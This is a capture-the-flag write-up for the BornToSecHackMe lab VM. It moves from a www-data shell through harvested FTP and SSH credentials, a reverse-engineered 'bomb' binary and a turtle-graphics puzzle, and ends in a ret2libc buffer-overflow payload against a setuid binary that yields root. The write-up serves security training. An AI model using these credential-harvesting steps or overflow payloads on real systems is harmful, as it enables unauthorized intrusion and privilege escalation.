# Privilege Escalation #2

After spawning a shell, I checked the current user:

```bash
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

I found the FTP (File Transfer Protocol) username and password:

```bash
www-data@BornToSecHackMe:/home/LOOKATME$ cat password
cat password
lmezard:G!@M6f4Eatau{sF"
www-data@BornToSecHackMe:/home/LOOKATME$
```

Then, I connected to FTP and found two files: `fun` and `README`:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||19245|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>
```

I downloaded these files to the local machine:

```bash
ftp> get fun README
local: README remote: fun
229 Entering Extended Passive Mode (|||18609|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |******************************************************************************************************************|   790 KiB  131.69 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (119.33 MiB/s)
ftp>
```

The `README` file indicated that this is a challenge, and solving it would provide the password for SSH access to the `laurie` user.

---

## **Solving the Challenge**

The `fun` file turned out to be a tar archive. I extracted it using:

```bash
tar xvf fun
```

This produced multiple files with `.pcap` extensions. However, they weren’t actual packet capture files. Instead, each contained a piece of C code and a file number in the comments.

To reconstruct the full program, I wrote a Python script to merge these files in the correct order. After running it:

```bash
$ ./scripts/pcap_files_to_c.py
$ gcc main.c
$ ./a.out
```

The program output:

```
./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

However, the challenge required hashing this password using SHA-256 before use:

```bash
echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Now, we can use this hash as the password to SSH into the `laurie` user account!

## Connecting to SSH as `laurie`

After connecting to the `laurie` user via SSH, I found two files: a binary file named `bomb` and a `README` file.

```bash
┌──(yoyo㉿kali)-[~]
└─$ ssh laurie@10.12.100.24
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@10.12.100.24's password:
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$
```

The goal is to retrieve the password for the `thor` user in order to connect via SSH.

```bash
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the passwords, use them as the "thor" user with SSH.

HINT:
P
2
b

o
4

NO SPACES IN THE PASSWORD (password is case-sensitive).
laurie@BornToSecHackMe:~$
```

To retrieve the password, we need to **defuse the bomb**. Let's get started!

---

## **Binary Analysis**

The binary has **six phases**, and we must retrieve a password for each phase in order to progress to the next one and complete the challenge.

```nasm
# Initialize and Start Game
0x08048a30 <+128>:  call   0x8049160         # Call initialize_bomb()

# Phase 1
0x08048a52 <+162>:  call   0x80491fc         # Call read_line()
0x08048a5a <+170>:  push   %eax              # Push return value (input string)
0x08048a5b <+171>:  call   0x8048b20         # Call phase_1()
0x08048a60 <+176>:  call   0x804952c         # Call phase_defused()

# Similar pattern repeats for phases 2-6
# Phase 2
0x08048a75 <+197>:  call   0x80491fc         # read_line()
0x08048a7e <+206>:  call   0x8048b48         # phase_2()

# Phase 3
0x08048a98 <+232>:  call   0x80491fc         # read_line()
0x08048aa1 <+241>:  call   0x8048b98         # phase_3()

# Phase 4
0x08048abb <+267>:  call   0x80491fc         # read_line()
0x08048ac4 <+276>:  call   0x8048ce0         # phase_4()

# Phase 5
0x08048ade <+302>:  call   0x80491fc         # read_line()
0x08048ae7 <+311>:  call   0x8048d2c         # phase_5()

# Phase 6
0x08048b01 <+337>:  call   0x80491fc         # read_line()
0x08048b0a <+346>:  call   0x8048d98         # phase_6()
```

- The program initializes a **bomb** that requires user input.
- It sequentially calls **phase_1**, **phase_2**, **phase_3**, and so on.
- Each phase requires a **specific password** to proceed.
- The hint in `README` suggests that the password follows a certain pattern.

Our goal is to reverse-engineer the `bomb` binary, solve each phase, and obtain the final password for `thor`.

### **Next Steps**

1. Analyze each phase function to determine the required input.
2. Use debugging techniques like `gdb`, and  to retrieve the necessary passwords.
3. Successfully defuse the bomb and retrieve `thor`'s SSH credentials.

Let's go! 🚀

## **Phase 1**

Let's analyze the assembly code of `phase_1`:

```nasm
0x08048b23 <+3>:    sub    $0x18,%esp
0x08048b26 <+6>:    mov    0x8(%ebp),%eax      ; Load argument (input string)
0x08048b29 <+9>:    mov    %eax,-0x4(%ebp)
0x08048b2c <+12>:   mov    -0x4(%ebp),%eax
0x08048b2f <+15>:   mov    $0x80497c0,%edx     ; Address of a string
```

The input string is compared with a string located at **`0x80497c0`**. If the strings are not equal, the function **`explode_bomb`** is called. Let's examine the string at `0x80497c0`:

```nasm
(gdb) x/s 0x80497c0
0x80497c0:	 "Public speaking is very easy."
(gdb)
```

### **Solution for Phase 1:**

The correct input for this phase is:

```
Public speaking is very easy.
```

---

## **Phase 2**

After analyzing the assembly code, I found that the program starts with **1** and follows a pattern where each subsequent number is the previous number multiplied by its (current index + 1).

```nasm
0x08048b6e <+38>:   mov    $0x1,%ebx                 ; ebx = 1
0x08048b73 <+43>:   lea    -0x18(%ebp),%esi          ; esi = &numbers[0]
0x08048b76 <+46>:   lea    0x1(%ebx),%eax            ; eax = ebx + 1
0x08048b79 <+49>:   imul   -0x4(%esi,%ebx,4),%eax    ; eax *= numbers[ebx]
0x08048b7e <+54>:   cmp    %eax,(%esi,%ebx,4)        ; Compare eax with numbers[ebx + 1]
0x08048b81 <+57>:   je     0x8048b88 <phase_2+64>    ; If equal, continue
0x08048b83 <+59>:   call   0x80494fc <explode_bomb>  ; Else, explode bomb
0x08048b88 <+64>:   inc    %ebx                      ; ebx++
0x08048b89 <+65>:   cmp    $0x5,%ebx                 ; Compare ebx with 5
0x08048b8c <+68>:   jle    0x8048b76 <phase_2+46>    ; Loop if ebx <= 5
```

### **Translation of Assembly to C Code:**

This logic translates to the following C-like code:

```c
int numbers[6];  // Array to hold six numbers read from input

// Check first number
if (numbers[0] != 1)
    explode_bomb();

// Loop from index 1 to 5
for (int i = 1; i <= 5; i++) {
    if (numbers[i] == (i + 1) * numbers[i - 1]) {
        continue;
    } else {
        explode_bomb();
    }
}
```

### **Deriving the Required Number Sequence:**

- `numbers[0] = 1`
- For `i` from 1 to 5:
    
    ```
    numbers[i] = (i + 1) * numbers[i - 1]
    
    Example:
    numbers[3] = (3 + 1) * numbers[2]
               = 4 * 6
               = 24
    ```
    

### **Solution for Phase 2:**

The correct input for this phase is:

```
1 2 6 24 120 720
```

## **Phase 3**

Phase 3 requires you to input specific values that satisfy the conditions set in the program. Based on the disassembled code, we can deduce what those conditions are.

### **Step-by-Step Analysis**

The phase reads input using **`sscanf`**, which suggests it expects specific input formats:

```nasm
0x08048bb1 <+25>: push $0x80497de        ; Address of format string
0x08048bb7 <+31>: call 0x8048860 sscanf@plt
```

Let's examine the format string at address **`0x80497de`**:

```nasm
(gdb) x/s 0x80497de
0x80497de: "%d %c %d"
```

The program expects **three inputs**: an integer (**`%d`**), a character (**`%c`**), and another integer (**`%d`**).

After reading the inputs, the program validates them:

```nasm
0x08048bbf <+39>: cmp $0x2,%eax          ; Check number of inputs read
0x08048bc2 <+42>: jg 0x8048bc9 <phase_3+49>
0x08048bc4 <+44>: call 0x80494fc <explode_bomb>
```

The first number (**`num1`**) must be **less than or equal to 7**. If **`num1 > 7`**, the bomb explodes.

```nasm
0x08048bc9 <+49>: cmpl $0x7,-0xc(%ebp)   ; Compare first number with 7
0x08048bcd <+53>: ja 0x8048c88 <phase_3+240> ; Jump if first number > 7
```

We'll analyze what happens in each case.

### **Cases:**

```nasm
;Case 0: num1 == 0
0x08048bdd <Case0>: lea 0x0(%esi),%esi       ; No operation
0x08048be0 <Case0+3>: mov $0x71,%bl          ; bl = 'q' (ASCII 0x71)
0x08048be2 <Case0+5>: cmpl $0x309,-0x4(%ebp) ; Compare num2 with 777
0x08048be9 <Case0+12>: je Success

;Case 1: num1 == 1
0x08048bf9 <Case1>: mov $0x62,%bl            ; bl = 'b'
0x08048c02 <Case1+9>: cmpl $0xd6,-0x4(%ebp)  ; Compare num2 with 214

;Case 2: num1 == 2
0x08048c16 <Case2>: mov $0x62,%bl            ; bl = 'b'
0x08048c18 <Case2+2>: cmpl $0x2f3,-0x4(%ebp) ; Compare num2 with 755

;Case 3: num1 == 3
0x08048c28 <Case3>: mov $0x6b,%bl            ; bl = 'k'
0x08048c2a <Case3+2>: cmpl $0xfb,-0x4(%ebp)  ; Compare num2 with 251

;Case 4: num1 == 4
0x08048c3a <Case4>: mov $0x6f,%bl            ; bl = 'o'
0x08048c42 <Case4+8>: cmpl $0xa0,-0x4(%ebp)  ; Compare num2 with 160

;Case 5: num1 == 5
0x08048c52 <Case5>: mov $0x74,%bl            ; bl = 't'
0x08048c54 <Case5+2>: cmpl $0x1ca,-0x4(%ebp) ; Compare num2 with 458

;Case 6: num1 == 6
0x08048c64 <Case6>: mov $0x76,%bl            ; bl = 'v'
0x08048c66 <Case6+2>: cmpl $0x30c,-0x4(%ebp) ; Compare num2 with 780

;Case 7: num1 == 7
0x08048c76 <Case7>: mov $0x62,%bl            ; bl = 'b'
0x08048c78 <Case7+2>: cmpl $0x20c,-0x4(%ebp) ; Compare num2 with 524
```

The last step compares the expected character with the user input.

```nasm
0x08048c8f <+247>: cmp -0x5(%ebp),%bl  ; Compare input character with expected
0x08048c92 <+250>: je Success
0x08048c94 <+252>: call 0x80494fc <explode_bomb>

```

### **Solution for Phase 3:**

Valid inputs include:

```
4 o 160
0 q 777
1 b 214
```

## **Phase 4**

After analyzing the assembly code of `phase_4`, we found that it calls a function named `func4`, which takes a number as input. The return value of `func4` is then compared with **0x37 (55 in decimal)**. If the result is **55**, the bomb is defused; otherwise, it explodes.

### **Disassembled Code Analysis:**

```nasm
# Setup for sscanf
0x08048ce6 <+6>:     mov    0x8(%ebp),%edx     # Get input string from parameter
0x08048ce9 <+9>:     add    $0xfffffffc,%esp   # Adjust stack
0x08048cec <+12>:    lea    -0x4(%ebp),%eax    # Get address for storing scanned number
0x08048cef <+15>:    push   %eax               # Push address for sscanf
0x08048cf0 <+16>:    push   $0x8049808         # Push format string (likely "%d")
0x08048cf5 <+21>:    push   %edx               # Push input string
0x08048cf6 <+22>:    call   0x8048860          # Call sscanf

# Check sscanf result and input value
0x08048cfb <+27>:    add    $0x10,%esp         # Clean up stack
0x08048cfe <+30>:    cmp    $0x1,%eax          # Check if sscanf read 1 item
0x08048d01 <+33>:    jne    0x8048d09          # If not 1 item, explode
0x08048d03 <+35>:    cmpl   $0x0,-0x4(%ebp)    # Check if number > 0
0x08048d07 <+39>:    jg     0x8048d0e          # If > 0, continue, else explode
0x08048d09 <+41>:    call   0x80494fc          # Call explode_bomb

# Call func4 and check result
0x08048d0e <+46>:    add    $0xfffffff4,%esp   # Adjust stack
0x08048d11 <+49>:    mov    -0x4(%ebp),%eax    # Get scanned number
0x08048d14 <+52>:    push   %eax               # Push as parameter to func4
0x08048d15 <+53>:    call   0x8048ca0          # Call func4
0x08048d1a <+58>:    add    $0x10,%esp         # Clean up stack
0x08048d1d <+61>:    cmp    $0x37,%eax         # Compare result with 0x37 (55 in decimal)
0x08048d20 <+64>:    je     0x8048d27          # If equal, defuse, else explode
0x08048d22 <+66>:    call   0x80494fc          # Call explode_bomb
```

### **Understanding `func4`**

After further analysis, we discovered that `func4` calculates the **Fibonacci sequence**, where:

- **`F(0) = 1`**
- **`F(1) = 1`**
- For **`n > 1`**, **`F(n) = F(n - 1) + F(n - 2)`**

```nasm
0x08048ca8 <+8>:    mov    0x8(%ebp),%ebx       ; n (input number)
0x08048cab <+11>:   cmp    $0x1,%ebx            ; Compare n with 1
0x08048cae <+14>:   jle    0x8048cd0 <func4+48> ; If n <= 1, return 1
0x08048cb3 <+19>:   lea    -0x1(%ebx),%eax      ; eax = n - 1
0x08048cb7 <+23>:   call   0x8048ca0 <func4>    ; func4(n - 1)
0x08048ccc <+44>:   jmp    0x8048cd5 <func4+53> ; Jump to end
0x08048cd0 <+48>:   mov    $0x1,%eax            ; Base case: return 1

```

We need to find the smallest `n` such that **`func4(n) == 55`**.

### **Computing Fibonacci Numbers:**

1. **F(0) = 1**
2. **F(1) = 1**
3. **F(2) = F(1) + F(0) = 1 + 1 = 2**
4. **F(3) = F(2) + F(1) = 2 + 1 = 3**
5. **F(4) = F(3) + F(2) = 3 + 2 = 5**
6. **F(5) = 5 + 3 = 8**
7. **F(6) = 8 + 5 = 13**
8. **F(7) = 13 + 8 = 21**
9. **F(8) = 21 + 13 = 34**
10. **F(9) = 34 + 21 = 55**

### **Solution for Phase 4:**

```
9
```

This revised document improves clarity, correctness, and structure. Let me know if you need further refinements! 🚀

## **Phase 5**

After analyzing the assembly code, I identified a binary bomb. The goal is to provide a specific 6-character string that, when processed by the program, results in the target string **"giants"**.

### **Assembly Code Analysis**

The relevant assembly code snippet for this phase is:

```nasm
; Function setup
0x08048d2c <+0>:     push   %ebp
0x08048d2d <+1>:     mov    %esp,%ebp
0x08048d2f <+3>:     sub    $0x10,%esp        ; Allocate 16 bytes on stack
0x08048d32 <+6>:     push   %esi
0x08048d33 <+7>:     push   %ebx

; Get input string
0x08048d34 <+8>:     mov    0x8(%ebp),%ebx    ; Load input string address into ebx

; Check string length
0x08048d37 <+11>:    add    $0xfffffff4,%esp
0x08048d3a <+14>:    push   %ebx              ; Push input string as parameter
0x08048d3b <+15>:    call   0x8049018 <string_length>
0x08048d40 <+20>:    add    $0x10,%esp
0x08048d43 <+23>:    cmp    $0x6,%eax         ; Compare length with 6
0x08048d46 <+26>:    je     0x8048d4d         ; If length == 6, continue
0x08048d48 <+28>:    call   0x80494fc <explode_bomb>  ; Otherwise, explode

; Initialize transformation loop
0x08048d4d <+33>:    xor    %edx,%edx         ; edx = 0 (counter)
0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx   ; ecx = address of output buffer
0x08048d52 <+38>:    mov    $0x804b220,%esi   ; esi = address of lookup table

; Main transformation loop
0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al ; al = input[counter]
0x08048d5a <+46>:    and    $0xf,%al          ; al = al & 0xF (last 4 bits)
0x08048d5c <+48>:    movsbl %al,%eax          ; Sign extend al to eax
0x08048d5f <+51>:    mov    (%eax,%esi,1),%al ; al = lookup_table[al]
0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1) ; output[counter] = al
0x08048d65 <+57>:    inc    %edx              ; counter++
0x08048d66 <+58>:    cmp    $0x5,%edx         ; Compare counter with 5
0x08048d69 <+61>:    jle    0x8048d57         ; If counter <= 5, continue loop

; Null-terminate the output string
0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)   ; Add null terminator

; Compare with target string
0x08048d6f <+67>:    add    $0xfffffff8,%esp
0x08048d72 <+70>:    push   $0x804980b        ; Push address of "giants"
0x08048d77 <+75>:    lea    -0x8(%ebp),%eax   ; Load address of output buffer
0x08048d7a <+78>:    push   %eax              ; Push output buffer
0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
```

The goal is to find an input string that, after transformation, matches the target string **"giants"**.

```nasm
gdb) x/s 0x804980b
0x804980b:	 "giants"
(gdb)
```

The lookup table used for transformation is:

```nasm
gdb) x/s 0x804b220
0x804b220 <array.123>:	 "isrveawhobpnutfg\260\001"
(gdb)
```

### **Reverse-Engineering the Input**

For each character in the input string:

1. **Apply a bitwise AND with `0xF`** to compute the index:
    
    ```
    index = input_char & 0xF
    ```
    
    This results in an index between `0` and `15`.
    
2. **Use the lookup table** to find the transformed character:
    
    ```
    transformed_char = lookup_table[index]
    ```
    

To find a valid input string, we need to determine the indices in the lookup table that map to `"giants"`.

### **Finding Indices for Each Target Character**

We extract the index positions of each letter in `"giants"`:

| Target Char | Lookup Table Index |
| --- | --- |
| **'g'** | **15** |
| **'i'** | **0** |
| **'a'** | **5** |
| **'n'** | **11** |
| **'t'** | **14** |
| **'s'** | **1** |

Now, we need to find input characters whose last 4 bits (`input_char & 0xF`) match these indices.

### **Determining Input Characters**

Each input character must have its last 4 bits (`0xF`, `0x0`, `0x5`, etc.) match the corresponding index.

| Target Index | Possible Input Characters |
| --- | --- |
| **15** (0xF) → 'g' | `'o'` (0x6F), `'?'` (0x7F) |
| **0** (0x0) → 'i' | `'p'` (0x70), `'@'` (0x40) |
| **5** (0x5) → 'a' | `'u'` (0x75), `'e'` (0x65) |
| **11** (0xB) → 'n' | `'k'` (0x6B), `'{'` (0x7B) |
| **14** (0xE) → 't' | `'n'` (0x6E), `'^'` (0x5E) |
| **1** (0x1) → 's' | `'q'` (0x71), `'a'` (0x61) |

### **Solution for Phase 5:**

```
opukmq
```

## **Phase 6**

In **Phase 6** of the binary bomb challenge, we need to determine a specific sequence of six numbers that, when processed by the program, will defuse the bomb. We'll analyze the provided assembly code step by step to understand what the program expects and how to derive the correct input.

```nasm
# Initialize and Read Input
0x08048da1 <+9>:     mov    0x8(%ebp),%edx     # Get input string
0x08048da4 <+12>:    movl   $0x804b26c,-0x34(%ebp) # Store node address
0x08048db3 <+27>:    call   0x8048fd8          # Call read_six_numbers

# First Loop: Validate Numbers (1-6)
0x08048db8 <+32>:    xor    %edi,%edi          # edi = 0 (counter)
0x08048dc0 <+40>:    lea    -0x18(%ebp),%eax   # Load array address
0x08048dc3 <+43>:    mov    (%eax,%edi,4),%eax # Get number[i]
0x08048dc6 <+46>:    dec    %eax               # Decrease by 1
0x08048dc7 <+47>:    cmp    $0x5,%eax          # Compare with 5
0x08048dca <+50>:    jbe    0x8048dd1          # If <= 5, continue
0x08048dcc <+52>:    call   0x80494fc          # Else explode

# Second Loop: Check for Duplicates
0x08048dd1 <+57>:    lea    0x1(%edi),%ebx     # ebx = i + 1
0x08048de9 <+81>:    mov    (%edx,%esi,1),%eax # Get current number
0x08048dec <+84>:    cmp    (%esi,%ebx,4),%eax # Compare with next number
0x08048def <+87>:    jne    0x8048df6          # If not equal, continue
0x08048df1 <+89>:    call   0x80494fc          # Else explode

# Node Reordering Section
0x08048e10 <+120>:   mov    -0x34(%ebp),%esi   # Get node pointer
0x08048e13 <+123>:   mov    $0x1,%ebx          # Counter = 1
0x08048e30 <+152>:   mov    0x8(%esi),%esi     # Move to next node
0x08048e33 <+155>:   inc    %ebx               # Increment counter
0x08048e34 <+156>:   cmp    %eax,%ebx          # Compare counters
0x08048e36 <+158>:   jl     0x8048e30          # Loop if less

# Final Validation Loop
0x08048e70 <+216>:   mov    0x8(%esi),%edx     # Get next node
0x08048e73 <+219>:   mov    (%esi),%eax        # Get current value
0x08048e75 <+221>:   cmp    (%edx),%eax        # Compare values
0x08048e77 <+223>:   jge    0x8048e7e          # If current >= next, continue
0x08048e79 <+225>:   call   0x80494fc          # Else explode
```

In **`phase_6`**, the program works with a linked list of nodes. Each node likely has the following structure:

```nasm
typedef struct Node {
int value;            // 4 bytes
struct Node* next;    // 4 bytes
} Node;
```

- **Total size per node**: 8 bytes.
- **Nodes**: There are 6 nodes, as indicated by the range of acceptable input numbers (1-6).

```nasm
(gdb) x/s 0x804b26c
0x804b26c <node1>:	  <incomplete sequence \375>
(gdb)
```

## **Values from GDB**

```nasm
(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432
```

## **Objective**

- **Goal:** Provide a sequence of six numbers corresponding to node numbers that, when rearranged according to the program's logic, result in the nodes being in **strictly decreasing order** based on their values.
- **Constraints:**
    - Input numbers must be unique and between **1 and 6**.
    - The rearranged linked list must have node values in **descending order**.

Now, sort the nodes based on their values in **descending order**:

1. **Node 4:** 997
2. **Node 2:** 725
3. **Node 6:** 432
4. **Node 3:** 301
5. **Node 1:** 253
6. **Node 5:** 212

## **Solution for Phase 6:**

```nasm
4 2 6 3 1 5
```

## 

## **Connecting to SSH as `thor`**

After successfully navigating all the phases of the **binary bomb**, we are presented with a **`README`** file containing hints to construct the final password for the **`thor`** user.

### **Extracting the Hints**

The file provides the following characters:

```nasm

P
2
b
(Blank line)
o
4
```

### **Understanding the Pattern**

- There are **six lines**, which correspond to the **six phases** of the challenge.
- Each character represents the **first letter** of the password used to solve its respective phase.
- This implies that the final password for **`thor`** is the **concatenation of all six phase passwords in order**.

### **Final Password for `thor`:**

```nasm
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## **Connecting to SSH as `thor`**

Once connected to `thor` via SSH, I found two files: **README** and **turtle**.

```bash
laurie@BornToSecHackMe:~$ ssh thor@10.12.100.24
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@10.12.100.24's password:
thor@BornToSecHackMe:~$
```

### **Exploring the README File**

The **README** file contained a simple challenge:

```bash
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
thor@BornToSecHackMe:~$
```

This meant that solving the challenge hidden within the **turtle** file would reveal the password for the `zaz` user.

---

### **Inspecting the Turtle File**

Upon opening the **turtle** file, I found a series of turtle graphics commands written in French. These instructions resembled commands used in the Python **turtle** graphics module to move a virtual turtle and draw shapes.

```bash

thor@BornToSecHackMe:~$ cat turtle
[...]
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
thor@BornToSecHackMe:~$
```

The phrase **"Can you digest the message? :)"** hinted that the final output needed to be processed further.

---

### **Solving the Challenge**

### **1. Visualizing the Turtle Graphics**

Since Python has a built-in **turtle** graphics module, I wrote a simple script to interpret these commands and visualize the drawing. Running the script revealed that the turtle’s movements formed the word **"SLASH"**.

### **2. Hashing the Result**

At first, I tried using `"SLASH"` as the password for `zaz`, but it didn’t work. Then, remembering the hint **"Can you digest the message?"**, I realized it was referring to a **message digest**—specifically, an **MD5 hash**.

I generated the MD5 hash of `"SLASH"` using the following command:

```bash
$ echo -n 'SLASH' | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

## logged in as `zaz`

We discover the following files `exploit_me`setuid binary, which indicates a potential vulnerability. and `mail` directory containing possibly sensitive messages.

lets analyzing the Exploit the `rws` permission indicates that the file is a setuid binary, which means it runs with the privileges of the owner (`yo`). This presents a possible privilege escalation pat

```nasm
0x080483f7 <+3>:     and    $0xfffffff0,%esp  # Align stack
0x080483fa <+6>:     sub    $0x90,%esp        # Allocate 144 bytes on stack

# Check Arguments
0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)    # Compare argc with 1
0x08048404 <+16>:    jg     0x804840d         # If argc > 1, continue
0x08048406 <+18>:    mov    $0x1,%eax         # Else return 1
0x0804840b <+23>:    jmp    0x8048436         # Jump to end

# Main Program Logic
0x0804840d <+25>:    mov    0xc(%ebp),%eax    # Get argv
0x08048410 <+28>:    add    $0x4,%eax         # Point to argv[1]
0x08048413 <+31>:    mov    (%eax),%eax       # Get argv[1]
0x08048415 <+33>:    mov    %eax,0x4(%esp)    # Set up strcpy arg2 (source)
0x08048419 <+37>:    lea    0x10(%esp),%eax   # Get buffer address
0x0804841d <+41>:    mov    %eax,(%esp)       # Set up strcpy arg1 (destination)
0x08048420 <+44>:    call   0x8048300         # Call strcpy()
```

### Vulnerability

Buffer Overflow Vulnerability becouse Uses strcpy() which doesn't check buffer bounds and we have Buffer size is 144 bytes (0x90) with No input length checking

**What is Ret2Libc?**

Ret2Libc, short for "Return-to-Libc," is an exploit technique that takes control of a program's flow by calling existing library functions in memory. It's a clever way of executing arbitrary code without injecting it directly into the program.

**How Does It Work?**

A basic Ret2Libc exploit follows this structure:

```
padding + address of system + address of exit + address of "/bin/sh"

```

- **Padding**: Fills the buffer to align with the return address.
- **Address of system**: Points to the `system()` function, which can execute shell commands.
- **Address of exit**: Ensures the program exits cleanly after execution (optional, but skipping it may cause a crash).
- **Address of "/bin/sh"**: Points to the `/bin/sh` string in memory, which starts a shell.

**Crafting a Ret2Libc Exploit**

To build our exploit, we need three key memory addresses and the offset:

1. **`system()`**
    
    Use GDB to find the address of the `system()` function:
    
    ```
    (gdb) info function system
    0xb7e6b060  system
    ```
    
2. **`exit()`**
    
    Locate the `exit()` function in memory:
    
    ```
    (gdb) info function exit
    0xb7e5ebe0  exit
    ```
    
3. **`/bin/sh` string**
    
    Search for the `/bin/sh` string in the memory range of the libc library:
    
    ```
    (gdb) info proc mappings
        [...]
        0xb7e2c000 0xb7fcf000   0x1a3000  0x0 /lib/i386-linux-gnu/libc-2.15.so
        [...]
    (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
     0xb7f8cc58
    1 pattern found.
    ```
    

Binary Ninja indicates that the main function has a stack offset of 0x90 (144). Considering that the saved EBP occupies 4 bytes, we can conclude that the buffer is 140 bytes in length.

**Building the Payload**

Using the memory addresses we found, we can now craft our exploit payload.

**Structure**:

```
padding + address of system + address of exit + address of "/bin/sh"

```

**Payload in Python**:

```python
"\x90"*140 + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
```

Run the vulnerable program with the crafted payload:

```python
./exploit_me `python -c 'print("\x90"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
```

And...

```bash
# whoami
root
```

We did it! We've got root access!
